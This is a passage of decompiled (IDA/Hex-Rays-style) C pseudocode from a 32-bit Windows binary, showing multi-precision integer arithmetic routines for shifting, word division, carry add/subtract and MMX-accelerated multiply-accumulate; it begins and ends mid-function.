  v9 = a1;
  v10 = (31 - a3 + v8) / 32;
  v21 = v10;
  if ( a1 == a2 )
  {
    if ( !a3 )
      return 1;
  }
  else
  {
    a1[3] = a2[3];
    result = (int)sub_4173C0((int)a1, v10);
    if ( !result )
      return result;
    v9 = a1;
  }
  v11 = *v9;
  v12 = (int)a2[1] - v5;
  v13 = &(*a2)[v5];
  a1[1] = (unsigned int *)v21;
  if ( v6 )
  {
    v14 = *v13;
    v15 = v13 + 1;
    v22 = v12 - 1;
    if ( v12 != 1 )
    {
      do
      {
        v16 = v14;
        v14 = *v15;
        v17 = *v15++ << v20;
        ++v11;
        v18 = v22-- == 1;
        *(v11 - 1) = (v16 >> v6) | v17;
      }
      while ( !v18 );
    }
    v19 = v14 >> v6;
    if ( v19 )
    {
      *v11 = v19;
      return 1;
    }
    return 1;
  }
  if ( !v12 )
    return 1;
  do
  {
    *v11++ = *v13++;
    --v12;
  }
  while ( v12 );
  return 1;
}

//----- (00437EB0) --------------------------------------------------------
int __cdecl sub_437EB0(_DWORD *a1, unsigned int a2)
{
  unsigned __int64 v2; // rax
  int v3; // esi
  _DWORD *v4; // edi

  LODWORD(v2) = 0;
  if ( a2 )
  {
    v3 = a1[1] - 1;
    if ( v3 >= 0 )
    {
      v4 = (_DWORD *)(*a1 + 4 * v3);
      do
      {
        v2 = __PAIR64__(v2, *v4) % a2;
        --v3;
        --v4;
      }
      while ( v3 >= 0 );
    }
  }
  else
  {
    LODWORD(v2) = -1;
  }
  return v2;
}

//----- (00437F10) --------------------------------------------------------
int __cdecl sub_437F10(_DWORD *a1, unsigned int a2)
{
  int v4; // eax
  char v5; // si
  unsigned int v6; // ebp
  int v7; // edi
  unsigned int v8; // esi
  int v9; // eax
  int v10; // eax
  unsigned int v11; // [esp+4h] [ebp-4h]
  char v12; // [esp+10h] [ebp+8h]

  v11 = 0;
  if ( !a2 )
    return -1;
  if ( !a1[1] )
    return 0;
  v4 = sub_416830(a2);
  v5 = 32 - v4;
  v12 = 32 - v4;
  v6 = a2 << (32 - v4);
  if ( !sub_437C10(a1, a1, 32 - v4) )
    return -1;
  v7 = a1[1] - 1;
  if ( v7 >= 0 )
  {
    do
    {
      v8 = *(_DWORD *)(*a1 + 4 * v7);
      v9 = sub_4387C0(v11, v8, v6);
      --v7;
      *(_DWORD *)(*a1 + 4 * v7 + 4) = v9;
      v11 = v8 - v6 * v9;
    }
    while ( v7 >= 0 );
    v5 = v12;
  }
  v10 = a1[1];
  if ( v10 > 0 && !*(_DWORD *)(*a1 + 4 * v10 - 4) )
    a1[1] = v10 - 1;
  return v11 >> v5;
}

//----- (00437FD0) --------------------------------------------------------
int __cdecl sub_437FD0(int *a1, int a2)
{
  unsigned int v2; // esi
  int result; // eax
  int v4; // esi
  int i; // ebx
  unsigned int *v6; // ecx
  unsigned int v7; // eax
  int v8; // eax
  int v9; // edx

  v2 = a2;
  if ( !a2 )
    return 1;
  if ( sub_416DB0((int)a1) )
    return sub_417490(a1, a2);
  if ( a1[3] )
  {
    a1[3] = 0;
    v4 = sub_438090(a1, a2);
    if ( !sub_416DB0((int)a1) )
      a1[3] = a1[3] == 0;
    return v4;
  }
  else
  {
    for ( i = 0; i < a1[1]; ++i )
    {
      v6 = (unsigned int *)(*a1 + 4 * i);
      v7 = v2 + *v6;
      v2 = v7 < v2;
      *v6 = v7;
      if ( !v2 )
        return 1;
    }
    if ( v2 )
    {
      v8 = a1[1];
      if ( i == v8 )
      {
        result = (int)sub_4173C0((int)a1, v8 + 1);
        if ( !result )
          return result;
        v9 = *a1;
        ++a1[1];
        *(_DWORD *)(v9 + 4 * i) = v2;
      }
    }
    return 1;
  }
}
// 438090: using guessed type _DWORD __cdecl sub_438090(_DWORD, _DWORD);

//----- (00438090) --------------------------------------------------------
int __cdecl sub_438090(int *a1, unsigned int a2)
{
  int v2; // edi
  int result; // eax
  int v4; // edi
  int v5; // ecx
  int v6; // edx
  int v7; // edx

  v2 = a2;
  if ( !a2 )
    return 1;
  if ( sub_416DB0((int)a1) )
  {
    v4 = sub_417490(a1, a2);
    if ( v4 )
      sub_417390((int)a1, 1);
    return v4;
  }
  else if ( a1[3] )
  {
    a1[3] = 0;
    result = sub_437FD0(a1, a2);
    a1[3] = 1;
  }
  else
  {
    result = 1;
    if ( a1[1] == 1 && *(_DWORD *)*a1 < a2 )
    {
      *(_DWORD *)*a1 = a2 - *(_DWORD *)*a1;
      a1[3] = 1;
    }
    else
    {
      v5 = 0;
      if ( *(_DWORD *)*a1 < a2 )
      {
        v6 = 0;
        do
        {
          *(_DWORD *)(v6 + *a1) -= v2;
          ++v5;
          v6 = 4 * v5;
          v2 = 1;
        }
        while ( !*(_DWORD *)(4 * v5 + *a1) );
      }
      *(_DWORD *)(*a1 + 4 * v5) -= v2;
      if ( !*(_DWORD *)(*a1 + 4 * v5) )
      {
        v7 = a1[1] - 1;
        if ( v5 == v7 )
          a1[1] = v7;
      }
    }
  }
  return result;
}

//----- (00438150) --------------------------------------------------------
int __cdecl sub_438150(unsigned int **a1, unsigned int a2)
{
  int v2; // ecx
  int result; // eax
  int v4; // edi

  v2 = (int)a1[1];
  if ( v2 )
  {
    if ( !a2 )
    {
      sub_417490(a1, 0);
      return 1;
    }
    v4 = sub_4384B0(*a1, *a1, v2, a2);
    if ( v4 )
    {
      result = (int)sub_4173C0((int)a1, (int)a1[1] + 1);
      if ( !result )
        return result;
      (*a1)[(_DWORD)a1[1]] = v4;
      a1[1] = (unsigned int *)((char *)a1[1] + 1);
    }
  }
  return 1;
}

//----- (004381C0) --------------------------------------------------------
int __cdecl sub_4381C0(unsigned int *a1, unsigned int *a2, int a3, unsigned int a4)
{
  unsigned int *v4; // eax
  unsigned int *v5; // edx
  int v6; // ecx
  __m64 v7; // mm0
  __m64 v8; // mm1
  __m64 v9; // mm1
  __m64 v10; // mm3
  __m64 v11; // mm5
  __m64 v12; // mm7
  __m64 v13; // mm2
  __m64 v14; // mm4
  __m64 v15; // mm1
  __m64 v16; // mm6
  __m64 v17; // mm3
  __m64 v18; // mm1
  __m64 v19; // mm2
  __m64 v20; // mm1
  __m64 v21; // mm4
  __m64 v22; // mm1
  __m64 v23; // mm6
  __m64 v24; // mm1
  __m64 v25; // mm3
  __m64 v26; // mm1
  __m64 v27; // mm1
  __m64 v28; // mm2
  __m64 v29; // mm1
  int result; // eax
  unsigned int v31; // esi
  unsigned int *v32; // edi
  unsigned int *v33; // ebx
  unsigned int v34; // ecx
  unsigned __int64 v35; // rax
  unsigned __int64 v36; // rax
  unsigned __int64 v37; // rax
  unsigned __int64 v38; // rax
  unsigned __int64 v39; // rax
  unsigned __int64 v40; // rax
  unsigned __int64 v41; // rax
  unsigned __int64 v42; // rax
  unsigned __int64 v43; // rax
  unsigned __int64 v44; // rax
  unsigned __int64 v45; // rax
  unsigned __int64 v46; // rax
  unsigned __int64 v47; // rax
  unsigned __int64 v48; // rax
  unsigned __int64 v49; // rax

  if ( _bittest(&dword_73C6D0, 0x1Au) )
  {
    v4 = a1;
    v5 = a2;
    v6 = a3;
    v7 = _mm_cvtsi32_si64(a4);
    v8.m64_u64 = 0i64;
    while ( (v6 & 0xFFFFFFF8) != 0 )
    {
      v9 = _mm_add_si64(_mm_add_si64(v8, _mm_cvtsi32_si64(*v4)), _mm_mul_su64(_mm_cvtsi32_si64(*v5), v7));
      v10 = _mm_add_si64(_mm_cvtsi32_si64(v4[1]), _mm_mul_su64(_mm_cvtsi32_si64(v5[1]), v7));
      v11 = _mm_add_si64(_mm_cvtsi32_si64(v4[2]), _mm_mul_su64(_mm_cvtsi32_si64(v5[2]), v7));
      v12 = _mm_add_si64(_mm_mul_su64(_mm_cvtsi32_si64(v5[3]), v7), _mm_cvtsi32_si64(v4[3]));
      *v4 = _mm_cvtsi64_si32(v9);
      v13 = _mm_mul_su64(_mm_cvtsi32_si64(v5[4]), v7);
      v14 = _mm_mul_su64(_mm_cvtsi32_si64(v5[5]), v7);
      v15 = _mm_add_si64(_m_psrlqi(v9, 0x20u), v10);
      v16 = _mm_mul_su64(_mm_cvtsi32_si64(v5[6]), v7);
      v4[1] = _mm_cvtsi64_si32(v15);
      v17 = _mm_cvtsi32_si64(v5[7]);
      v5 += 8;
      v18 = _mm_add_si64(_m_psrlqi(v15, 0x20u), v11);
      v19 = _mm_add_si64(v13, _mm_cvtsi32_si64(v4[4]));
      v4[2] = _mm_cvtsi64_si32(v18);
      v20 = _mm_add_si64(_m_psrlqi(v18, 0x20u), v12);
      v21 = _mm_add_si64(v14, _mm_cvtsi32_si64(v4[5]));
      v4[3] = _mm_cvtsi64_si32(v20);
      v22 = _mm_add_si64(_m_psrlqi(v20, 0x20u), v19);
      v23 = _mm_add_si64(v16, _mm_cvtsi32_si64(v4[6]));
      v4[4] = _mm_cvtsi64_si32(v22);
      v24 = _mm_add_si64(_m_psrlqi(v22, 0x20u), v21);
      v25 = _mm_add_si64(_mm_mul_su64(v17, v7), _mm_cvtsi32_si64(v4[7]));
      v4[5] = _mm_cvtsi64_si32(v24);
      v26 = _mm_add_si64(_m_psrlqi(v24, 0x20u), v23);
      v4[6] = _mm_cvtsi64_si32(v26);
      v27 = _mm_add_si64(_m_psrlqi(v26, 0x20u), v25);
      v4[7] = _mm_cvtsi64_si32(v27);
      v4 += 8;
      v8 = _m_psrlqi(v27, 0x20u);
      v6 -= 8;
      if ( !v6 )
        goto LABEL_6;
    }
    do
    {
      v28 = _mm_mul_su64(_mm_cvtsi32_si64(*v5++), v7);
      v29 = _mm_add_si64(_mm_add_si64(v8, _mm_cvtsi32_si64(*v4)), v28);
      *v4 = _mm_cvtsi64_si32(v29);
      --v6;
      v8 = _m_psrlqi(v29, 0x20u);
      ++v4;
    }
    while ( v6 );
LABEL_6:
    result = _mm_cvtsi64_si32(v8);
    _m_empty();
  }
  else
  {
    v31 = 0;
    v32 = a1;
    v33 = a2;
    v34 = a3 & 0xFFFFFFF8;
    if ( (a3 & 0xFFFFFFF8) != 0 )
    {
      do
      {
        v35 = *v32 + v31 + a4 * (unsigned __int64)*v33;
        *v32 = v35;
        v36 = v32[1] + HIDWORD(v35) + a4 * (unsigned __int64)v33[1];
        v32[1] = v36;
        v37 = v32[2] + HIDWORD(v36) + a4 * (unsigned __int64)v33[2];
        v32[2] = v37;
        v38 = v32[3] + HIDWORD(v37) + a4 * (unsigned __int64)v33[3];
        v32[3] = v38;
        v39 = v32[4] + HIDWORD(v38) + a4 * (unsigned __int64)v33[4];
        v32[4] = v39;
        v40 = v32[5] + HIDWORD(v39) + a4 * (unsigned __int64)v33[5];
        v32[5] = v40;
        v41 = v32[6] + HIDWORD(v40) + a4 * (unsigned __int64)v33[6];
        v32[6] = v41;
        v42 = v32[7] + HIDWORD(v41) + a4 * (unsigned __int64)v33[7];
        v32[7] = v42;
        v31 = HIDWORD(v42);
        v34 -= 8;
        v33 += 8;
        v32 += 8;
      }
      while ( v34 );
    }
    if ( (a3 & 7) != 0 )
    {
      v43 = *v32 + v31 + a4 * (unsigned __int64)*v33;
      *v32 = v43;
      v31 = HIDWORD(v43);
      if ( (a3 & 7) != 1 )
      {
        v44 = v32[1] + HIDWORD(v43) + a4 * (unsigned __int64)v33[1];
        v32[1] = v44;
        v31 = HIDWORD(v44);
        if ( (a3 & 7) != 2 )
        {
          v45 = v32[2] + HIDWORD(v44) + a4 * (unsigned __int64)v33[2];
          v32[2] = v45;
          v31 = HIDWORD(v45);
          if ( (a3 & 7) != 3 )
          {
            v46 = v32[3] + HIDWORD(v45) + a4 * (unsigned __int64)v33[3];
            v32[3] = v46;
            v31 = HIDWORD(v46);
            if ( (a3 & 7) != 4 )
            {
              v47 = v32[4] + HIDWORD(v46) + a4 * (unsigned __int64)v33[4];
              v32[4] = v47;
              v31 = HIDWORD(v47);
              if ( (a3 & 7) != 5 )
              {
                v48 = v32[5] + HIDWORD(v47) + a4 * (unsigned __int64)v33[5];
                v32[5] = v48;
                v31 = HIDWORD(v48);
                if ( (a3 & 7) != 6 )
                {
                  v49 = v32[6] + HIDWORD(v48) + a4 * (unsigned __int64)v33[6];
                  v32[6] = v49;
                  return HIDWORD(v49);
                }
              }
            }
          }
        }
      }
    }
    return v31;
  }
  return result;
}
// 73C6D0: using guessed type int dword_73C6D0;

//----- (004384B0) --------------------------------------------------------
int __cdecl sub_4384B0(_DWORD *a1, unsigned int *a2, int a3, unsigned int a4)
{
  _DWORD *v4; // eax
  unsigned int *v5; // edx
  int v6; // ecx
  __m64 v7; // mm0
  __m64 v8; // mm1
  __m64 v9; // mm2
  __m64 v10; // mm1
  int result; // eax
  unsigned int v12; // esi
  _DWORD *v13; // edi
  unsigned int *v14; // ebx
  unsigned int v15; // ebp
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // rax
  unsigned __int64 v20; // rax
  unsigned __int64 v21; // rax
  unsigned __int64 v22; // rax
  unsigned __int64 v23; // rax
  unsigned __int64 v24; // rax
  unsigned __int64 v25; // rax
  unsigned __int64 v26; // rax
  unsigned __int64 v27; // rax
  unsigned __int64 v28; // rax
  unsigned __int64 v29; // rax
  unsigned __int64 v30; // rax

  if ( _bittest(&dword_73C6D0, 0x1Au) )
  {
    v4 = a1;
    v5 = a2;
    v6 = a3;
    v7 = _mm_cvtsi32_si64(a4);
    v8.m64_u64 = 0i64;
    do
    {
      v9 = _mm_mul_su64(_mm_cvtsi32_si64(*v5++), v7);
      v10 = _mm_add_si64(v8, v9);
      *v4 = _mm_cvtsi64_si32(v10);
      --v6;
      v8 = _m_psrlqi(v10, 0x20u);
      ++v4;
    }
    while ( v6 );
    result = _mm_cvtsi64_si32(v8);
    _m_empty();
  }
  else
  {
    v12 = 0;
    v13 = a1;
    v14 = a2;
    v15 = a3 & 0xFFFFFFF8;
    if ( (a3 & 0xFFFFFFF8) != 0 )
    {
      do
      {
        v16 = v12 + a4 * (unsigned __int64)*v14;
        *v13 = v16;
        v17 = HIDWORD(v16) + a4 * (unsigned __int64)v14[1];
        v13[1] = v17;
        v18 = HIDWORD(v17) + a4 * (unsigned __int64)v14[2];
        v13[2] = v18;
        v19 = HIDWORD(v18) + a4 * (unsigned __int64)v14[3];
        v13[3] = v19;
        v20 = HIDWORD(v19) + a4 * (unsigned __int64)v14[4];
        v13[4] = v20;
        v21 = HIDWORD(v20) + a4 * (unsigned __int64)v14[5];
        v13[5] = v21;
        v22 = HIDWORD(v21) + a4 * (unsigned __int64)v14[6];
        v13[6] = v22;
        v23 = HIDWORD(v22) + a4 * (unsigned __int64)v14[7];
        v13[7] = v23;
        v12 = HIDWORD(v23);
        v14 += 8;
        v13 += 8;
        v15 -= 8;
      }
      while ( v15 );
    }
    if ( (a3 & 7) != 0 )
    {
      v24 = v12 + a4 * (unsigned __int64)*v14;
      *v13 = v24;
      v12 = HIDWORD(v24);
      if ( (a3 & 7) != 1 )
      {
        v25 = HIDWORD(v24) + a4 * (unsigned __int64)v14[1];
        v13[1] = v25;
        v12 = HIDWORD(v25);
        if ( (a3 & 7) != 2 )
        {
          v26 = HIDWORD(v25) + a4 * (unsigned __int64)v14[2];
          v13[2] = v26;
          v12 = HIDWORD(v26);
          if ( (a3 & 7) != 3 )
          {
            v27 = HIDWORD(v26) + a4 * (unsigned __int64)v14[3];
            v13[3] = v27;
            v12 = HIDWORD(v27);
            if ( (a3 & 7) != 4 )
            {
              v28 = HIDWORD(v27) + a4 * (unsigned __int64)v14[4];
              v13[4] = v28;
              v12 = HIDWORD(v28);
              if ( (a3 & 7) != 5 )
              {
                v29 = HIDWORD(v28) + a4 * (unsigned __int64)v14[5];
                v13[5] = v29;
                v12 = HIDWORD(v29);
                if ( (a3 & 7) != 6 )
                {
                  v30 = HIDWORD(v29) + a4 * (unsigned __int64)v14[6];
                  v13[6] = v30;
                  return HIDWORD(v30);
                }
              }
            }
          }
        }
      }
    }
    return v12;
  }
  return result;
}
// 73C6D0: using guessed type int dword_73C6D0;

//----- (00438670) --------------------------------------------------------
int __cdecl sub_438670(unsigned __int64 a1, int a2)
{
  unsigned __int64 v2; // rax
  int v3; // ecx
  __m64 v4; // mm0
  unsigned int *v5; // edi
  unsigned __int64 *v6; // esi
  unsigned int v7; // ebx

  LODWORD(v2) = &dword_73C6D0;
  if ( _bittest(&dword_73C6D0, 0x1Au) )
  {
    v2 = a1;
    v3 = a2;
    do
    {
      v4 = _mm_cvtsi32_si64(*(_DWORD *)HIDWORD(v2));
      HIDWORD(v2) += 4;
      *(__m64 *)v2 = _mm_mul_su64(v4, v4);
      --v3;
      LODWORD(v2) = v2 + 8;
    }
    while ( v3 );
    _m_empty();
  }
  else
  {
    v5 = (unsigned int *)HIDWORD(a1);
    v6 = (unsigned __int64 *)a1;
    v7 = a2 & 0xFFFFFFF8;
    if ( (a2 & 0xFFFFFFF8) != 0 )
    {
      do
      {
        *v6 = *v5 * (unsigned __int64)*v5;
        v6[1] = v5[1] * (unsigned __int64)v5[1];
        v6[2] = v5[2] * (unsigned __int64)v5[2];
        v6[3] = v5[3] * (unsigned __int64)v5[3];
        v6[4] = v5[4] * (unsigned __int64)v5[4];
        v6[5] = v5[5] * (unsigned __int64)v5[5];
        v6[6] = v5[6] * (unsigned __int64)v5[6];
        v2 = v5[7] * (unsigned __int64)v5[7];
        v6[7] = v2;
        v5 += 8;
        v6 += 8;
        v7 -= 8;
      }
      while ( v7 );
    }
    if ( (a2 & 7) != 0 )
    {
      v2 = *v5 * (unsigned __int64)*v5;
      *v6 = v2;
      if ( (a2 & 7) != 1 )
      {
        v2 = v5[1] * (unsigned __int64)v5[1];
        v6[1] = v2;
        if ( (a2 & 7) != 2 )
        {
          v2 = v5[2] * (unsigned __int64)v5[2];
          v6[2] = v2;
          if ( (a2 & 7) != 3 )
          {
            v2 = v5[3] * (unsigned __int64)v5[3];
            v6[3] = v2;
            if ( (a2 & 7) != 4 )
            {
              v2 = v5[4] * (unsigned __int64)v5[4];
              v6[4] = v2;
              if ( (a2 & 7) != 5 )
              {
                v2 = v5[5] * (unsigned __int64)v5[5];
                v6[5] = v2;
                if ( (a2 & 7) != 6 )
                {
                  v2 = v5[6] * (unsigned __int64)v5[6];
                  v6[6] = v2;
                }
              }
            }
          }
        }
      }
    }
  }
  return v2;
}
// 73C6D0: using guessed type int dword_73C6D0;

//----- (004387C0) --------------------------------------------------------
int __cdecl sub_4387C0(unsigned int a1, unsigned int a2, unsigned int a3)
{
  return __PAIR64__(a1, a2) / a3;
}

//----- (004387D0) --------------------------------------------------------
unsigned int __cdecl sub_4387D0(int *a1, unsigned int *a2, unsigned int *a3, int a4)
{
  unsigned int result; // eax
  unsigned int v8; // ebp
  unsigned int v9; // eax
  int v10; // kr40_4
  unsigned int v11; // eax
  int v12; // kr48_4
  unsigned int v13; // eax
  int v14; // kr50_4
  unsigned int v15; // eax
  int v16; // kr58_4
  unsigned int v17; // eax
  int v18; // kr60_4
  unsigned int v19; // eax
  int v20; // kr68_4
  unsigned int v21; // eax
  int v22; // kr70_4
  int v23; // kr78_4
  int v24; // kr80_4
  unsigned __int64 v25; // kr90_8
  unsigned __int64 v26; // krA0_8
  unsigned __int64 v27; // krB0_8
  unsigned __int64 v28; // krC0_8
  unsigned __int64 v29; // krD0_8
  unsigned __int64 v30; // krE0_8

  result = 0;
  v8 = a4 & 0xFFFFFFF8;
  if ( (a4 & 0xFFFFFFF8) != 0 )
  {
    do
    {
      v10 = *a3 + result + *a2;
      v9 = (*a3 + result + (unsigned __int64)*a2) >> 32;
      *a1 = v10;
      v12 = a3[1] + v9 + a2[1];
      v11 = (a3[1] + v9 + (unsigned __int64)a2[1]) >> 32;
      a1[1] = v12;
      v14 = a3[2] + v11 + a2[2];
      v13 = (a3[2] + v11 + (unsigned __int64)a2[2]) >> 32;
      a1[2] = v14;
      v16 = a3[3] + v13 + a2[3];
      v15 = (a3[3] + v13 + (unsigned __int64)a2[3]) >> 32;
      a1[3] = v16;
      v18 = a3[4] + v15 + a2[4];
      v17 = (a3[4] + v15 + (unsigned __int64)a2[4]) >> 32;
      a1[4] = v18;
      v20 = a3[5] + v17 + a2[5];
      v19 = (a3[5] + v17 + (unsigned __int64)a2[5]) >> 32;
      a1[5] = v20;
      v22 = a3[6] + v19 + a2[6];
      v21 = (a3[6] + v19 + (unsigned __int64)a2[6]) >> 32;
      a1[6] = v22;
      v23 = a3[7] + v21 + a2[7];
      result = (a3[7] + v21 + (unsigned __int64)a2[7]) >> 32;
      a1[7] = v23;
      a2 += 8;
      a3 += 8;
      a1 += 8;
      v8 -= 8;
    }
    while ( v8 );
  }
  if ( (a4 & 7) != 0 )
  {
    v24 = *a3 + result + *a2;
    result = (*a3 + result + (unsigned __int64)*a2) >> 32;
    *a1 = v24;
    if ( (a4 & 7) != 1 )
    {
      v25 = a3[1] + result + (unsigned __int64)a2[1];
      result = HIDWORD(v25);
      a1[1] = v25;
      if ( (a4 & 7) != 2 )
      {
        v26 = a3[2] + HIDWORD(v25) + (unsigned __int64)a2[2];
        result = HIDWORD(v26);
        a1[2] = v26;
        if ( (a4 & 7) != 3 )
        {
          v27 = a3[3] + HIDWORD(v26) + (unsigned __int64)a2[3];
          result = HIDWORD(v27);
          a1[3] = v27;
          if ( (a4 & 7) != 4 )
          {
            v28 = a3[4] + HIDWORD(v27) + (unsigned __int64)a2[4];
            result = HIDWORD(v28);
            a1[4] = v28;
            if ( (a4 & 7) != 5 )
            {
              v29 = a3[5] + HIDWORD(v28) + (unsigned __int64)a2[5];
              result = HIDWORD(v29);
              a1[5] = v29;
              if ( (a4 & 7) != 6 )
              {
                v30 = a3[6] + HIDWORD(v29) + (unsigned __int64)a2[6];
                result = HIDWORD(v30);
                a1[6] = v30;
              }
            }
          }
        }
      }
    }
  }
  return result;
}

//----- (00438990) --------------------------------------------------------
unsigned int __cdecl sub_438990(_DWORD *a1, _DWORD *a2, unsigned int *a3, int a4)
{
  unsigned int result; // eax
  unsigned int v8; // ebp
  unsigned int v9; // ecx
  unsigned int v10; // eax
  unsigned int v11; // ecx
  unsigned int v12; // edx
  bool v13; // cf
  unsigned int v14; // ecx
  unsigned int v15; // eax
  unsigned int v16; // ecx
  unsigned int v17; // edx
  unsigned int v18; // ecx
  unsigned int v19; // eax
  unsigned int v20; // ecx
  unsigned int v21; // edx
  unsigned int v22; // ecx
  unsigned int v23; // eax
  unsigned int v24; // ecx
  unsigned int v25; // edx
  unsigned int v26; // ecx
  unsigned int v27; // eax
  unsigned int v28; // ecx
  unsigned int v29; // edx
  unsigned int v30; // ecx
  unsigned int v31; // eax
  unsigned int v32; // ecx
  unsigned int v33; // edx
  unsigned int v34; // ecx
  unsigned int v35; // eax
  unsigned int v36; // ecx
  unsigned int v37; // edx
  unsigned int v38; // ecx
  unsigned int v39; // ecx
  unsigned int v40; // ecx
  unsigned int v41; // edx
  unsigned int v42; // ecx
  unsigned int v43; // ecx
  unsigned int v44; // edx
  unsigned int v45; // ecx
  unsigned int v46; // ecx
  unsigned int v47; // edx
  unsigned int v48; // ecx
  unsigned int v49; // ecx
  unsigned int v50; // edx
  unsigned int v51; // ecx
  unsigned int v52; // ecx
  unsigned int v53; // edx
  unsigned int v54; // ecx
  unsigned int v55; // ecx
  unsigned int v56; // edx
  unsigned int v57; // ecx

  result = 0;
  v8 = a4 & 0xFFFFFFF8;
  if ( (a4 & 0xFFFFFFF8) != 0 )
  {
    do
    {
      v9 = *a2 - result;
      v10 = (v9 < *a3) + (*a2 < result);
      *a1 = v9 - *a3;
      v11 = a2[1];
      v12 = a3[1];
      v13 = v11 < v10;
      v14 = v11 - v10;
      v15 = (v14 < v12) + v13;
      a1[1] = v14 - v12;
      v16 = a2[2];
      v17 = a3[2];
      v13 = v16 < v15;
      v18 = v16 - v15;
      v19 = (v18 < v17) + v13;
      a1[2] = v18 - v17;
      v20 = a2[3];
      v21 = a3[3];
      v13 = v20 < v19;
      v22 = v20 - v19;
      v23 = (v22 < v21) + v13;
      a1[3] = v22 - v21;
      v24 = a2[4];
      v25 = a3[4];
      v13 = v24 < v23;
      v26 = v24 - v23;
      v27 = (v26 < v25) + v13;
      a1[4] = v26 - v25;
      v28 = a2[5];
      v29 = a3[5];
      v13 = v28 < v27;
      v30 = v28 - v27;
      v31 = (v30 < v29) + v13;
      a1[5] = v30 - v29;
      v32 = a2[6];
      v33 = a3[6];
      v13 = v32 < v31;
      v34 = v32 - v31;
      v35 = (v34 < v33) + v13;
      a1[6] = v34 - v33;
      v36 = a2[7];
      v37 = a3[7];
      v13 = v36 < v35;
      v38 = v36 - v35;
      result = (v38 < v37) + v13;
      a1[7] = v38 - v37;
      a2 += 8;
      a3 += 8;
      a1 += 8;
      v8 -= 8;
    }
    while ( v8 );
  }
  if ( (a4 & 7) != 0 )
  {
    v39 = *a2 - result;
    result = (v39 < *a3) + (*a2 < result);
    *a1 = v39 - *a3;
    if ( (a4 & 7) != 1 )
    {
      v40 = a2[1];
      v41 = a3[1];
      v13 = v40 < result;
      v42 = v40 - result;
      result = (v42 < v41) + v13;
      a1[1] = v42 - v41;
      if ( (a4 & 7) != 2 )
      {
        v43 = a2[2];
        v44 = a3[2];
        v13 = v43 < result;
        v45 = v43 - result;
        result = (v45 < v44) + v13;
        a1[2] = v45 - v44;
        if ( (a4 & 7) != 3 )
        {
          v46 = a2[3];
          v47 = a3[3];
          v13 = v46 < result;
          v48 = v46 - result;
          result = (v48 < v47) + v13;
          a1[3] = v48 - v47;
          if ( (a4 & 7) != 4 )
          {
            v49 = a2[4];
            v50 = a3[4];
            v13 = v49 < result;
            v51 = v49 - result;
            result = (v51 < v50) + v13;
            a1[4] = v51 - v50;
            if ( (a4 & 7) != 5 )
            {
              v52 = a2[5];
              v53 = a3[5];
              v13 = v52 < result;
              v54 = v52 - result;
              result = (v54 < v53) + v13;
              a1[5] = v54 - v53;
              if ( (a4 & 7) != 6 )
              {
                v55 = a2[6];
                v56 = a3[6];
                v13 = v55 < result;
                v57 = v55 - result;
                result = (v57 < v56) + v13;
                a1[6] = v57 - v56;
              }
            }
          }
        }
      }
    }
  }
  return result;
}

//----- (00438B50) --------------------------------------------------------
unsigned int __cdecl sub_438B50(_DWORD *a1, _DWORD *a2, unsigned int *a3, int a4, int a5)
{
  unsigned int result; // eax
  unsigned int v9; // ebp
  unsigned int v10; // ecx
  unsigned int v11; // eax
  unsigned int v12; // ecx
  unsigned int v13; // edx
  bool v14; // cf
  unsigned int v15; // ecx
  unsigned int v16; // eax
  unsigned int v17; // ecx
  unsigned int v18; // edx
  unsigned int v19; // ecx
  unsigned int v20; // eax
  unsigned int v21; // ecx
  unsigned int v22; // edx
  unsigned int v23; // ecx
  unsigned int v24; // eax
  unsigned int v25; // ecx
  unsigned int v26; // edx
  unsigned int v27; // ecx
  unsigned int v28; // eax
  unsigned int v29; // ecx
  unsigned int v30; // edx
  unsigned int v31; // ecx
  unsigned int v32; // eax
  unsigned int v33; // ecx
  unsigned int v34; // edx
  unsigned int v35; // ecx
  unsigned int v36; // eax
  unsigned int v37; // ecx
  unsigned int v38; // edx
  unsigned int v39; // ecx
  unsigned int v40; // ecx
  unsigned int v41; // ecx
  unsigned int v42; // ecx
  unsigned int v43; // ecx
  unsigned int v44; // ecx
  unsigned int v45; // ecx
  unsigned int v46; // ecx
  unsigned int i; // ebp
  int v48; // ecx
  int v49; // eax
  unsigned int v50; // edx
  int v51; // ecx
  int v52; // eax
  unsigned int v53; // edx
  int v54; // ecx
  int v55; // eax
  unsigned int v56; // edx
  int v57; // ecx
  int v58; // eax
  unsigned int v59; // edx
  int v60; // ecx
  int v61; // eax
  unsigned int v62; // edx
  int v63; // ecx
  int v64; // eax
  unsigned int v65; // edx
  int v66; // ecx
  int v67; // eax
  unsigned int v68; // edx
  unsigned int v69; // ecx
  int v70; // ecx
  unsigned int v71; // edx
  int v72; // ecx
  unsigned int v73; // edx
  int v74; // ecx
  unsigned int v75; // edx
  int v76; // ecx
  unsigned int v77; // edx
  int v78; // ecx
  unsigned int v79; // edx
  int v80; // ecx
  unsigned int v81; // edx
  int v82; // ecx
  int v83; // ebp
  unsigned int v84; // ecx
  unsigned int v85; // ecx
  unsigned int v86; // ecx
  unsigned int v87; // ecx
  unsigned int v88; // ecx
  unsigned int v89; // ecx
  unsigned int v90; // ecx
  int v91; // ebp
  int v92; // ebp
  unsigned int v93; // ecx
  int v94; // ebp
  unsigned int v95; // ecx
  int v96; // ebp
  unsigned int v97; // ecx
  int v98; // ebp
  unsigned int v99; // ecx
  int v100; // ebp
  unsigned int v101; // ecx
  unsigned int v102; // ecx

  result = 0;
  v9 = a4 & 0xFFFFFFF8;
  if ( (a4 & 0xFFFFFFF8) != 0 )
  {
    do
    {
      v10 = *a2 - result;
      v11 = (v10 < *a3) + (*a2 < result);
      *a1 = v10 - *a3;
      v12 = a2[1];
      v13 = a3[1];
      v14 = v12 < v11;
      v15 = v12 - v11;
      v16 = (v15 < v13) + v14;
      a1[1] = v15 - v13;
      v17 = a2[2];
      v18 = a3[2];
      v14 = v17 < v16;
      v19 = v17 - v16;
      v20 = (v19 < v18) + v14;
      a1[2] = v19 - v18;
      v21 = a2[3];
      v22 = a3[3];
      v14 = v21 < v20;
      v23 = v21 - v20;
      v24 = (v23 < v22) + v14;
      a1[3] = v23 - v22;
      v25 = a2[4];
      v26 = a3[4];
      v14 = v25 < v24;
      v27 = v25 - v24;
      v28 = (v27 < v26) + v14;
      a1[4] = v27 - v26;
      v29 = a2[5];
      v30 = a3[5];
      v14 = v29 < v28;
      v31 = v29 - v28;
      v32 = (v31 < v30) + v14;
      a1[5] = v31 - v30;
      v33 = a2[6];
      v34 = a3[6];
      v14 = v33 < v32;
      v35 = v33 - v32;
